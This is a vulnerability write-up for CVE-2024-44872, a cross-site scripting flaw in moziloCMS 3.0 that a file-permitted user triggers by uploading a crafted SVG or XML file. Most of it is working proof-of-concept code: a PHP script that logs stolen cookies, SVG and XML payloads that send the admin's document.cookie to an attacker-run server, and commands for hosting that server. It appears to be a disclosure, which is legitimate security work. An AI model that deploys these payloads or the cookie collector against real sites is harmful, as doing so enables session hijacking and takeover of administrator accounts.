# CVE-2024-44872: Authenticated Cross Site Scripting (XSS) Attack via SVG/XML File Upload In Mozilo V.3.0


### **Summary**


A reflected cross-site scripting (XSS) vulnerability in moziloCMS v3.0 allows attackers to execute arbitrary code in a user's browser by injecting a crafted payload into the `/admin/index.php?nojs=true&action=files&multi=true` endpoint. If an admin create a normal user via the following endpoint `/admin/index.php?nojs=true&action=admin&multi=true` and grant this user the '**Files**' permission under the '**Admin Tabs**', then this user can upload a crafted `.xml` or `.svg` containing a cross site scripting payload to grab the admin cookies.


### **Writeup**

Login as normal user with File upload permissions and log off other users including admin


![](https://i.imgur.com/HyNVoEe.png)


Save the below PHP file as '`cookie.php`' and host on a web file server e.g **python**, **ngrok**.

```bash
# python3
python3 -m http.server 8080

# ngrok
ngrok http 80
```

cookie.php (PoC Code) =>

```php
<?php

$ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
$ua=$_SERVER['HTTP_USER_AGENT'];


$fp=fopen('cookies.txt' , 'a+');

fwrite($fp, $ip.' '.$ua."\n");
fwrite($fp, urldecode($_SERVER['QUERY_STRING']). " \n\n");
fclose($fp);

?>
```

xss.svg (PoC Code) =>

```SVG
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    <script> var i=new Image(); i.src="http://127.0.0.1:8080/cookie.php?cookie="+document.cookie;</script>;
  </script>
</svg>
```

`xss.xml` (PoC Code) =>

```xml
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml"> var i=new Image(); i.src="http://127.0.0.1:8080/cookie.php?cookie="+document.cookie</something:script>
</body>
</html>
```

Upload `.svg` or `.xml` file with XSS payload and save still as the normal user 

![](https://i.imgur.com/2sHizRJ.png)


Then now wait for admin user to logoff other users and navigate to the "**Files**" menu


![](https://i.imgur.com/QdXsdf9.png)


Then when admin click on the XSS payload be it `.svg` or `.xml`, Attacker would get back admin cookie in their web server.


![](https://i.imgur.com/eg7dsuv.png)

